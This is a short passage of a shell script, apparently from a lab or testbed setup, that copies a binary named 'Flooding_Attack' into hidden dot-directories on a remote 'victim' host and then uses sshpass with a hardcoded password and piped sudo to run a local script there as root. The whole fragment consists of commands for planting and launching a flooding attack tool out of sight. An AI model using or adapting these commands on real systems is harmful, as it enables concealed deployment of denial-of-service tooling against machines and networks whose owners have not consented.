...
scp Flooding_Attack ${user}@${remotehost}:/home/victim/.david/.module
scp Flooding_Attack ${user}@${remotehost}:/home/victim/.steven/.module

sshpass -p 'victim' ssh ${user}@${remotehost} 'echo "victim" | sudo -Sv && bash -s' < /home/victim/Desktop/runetcc.sh
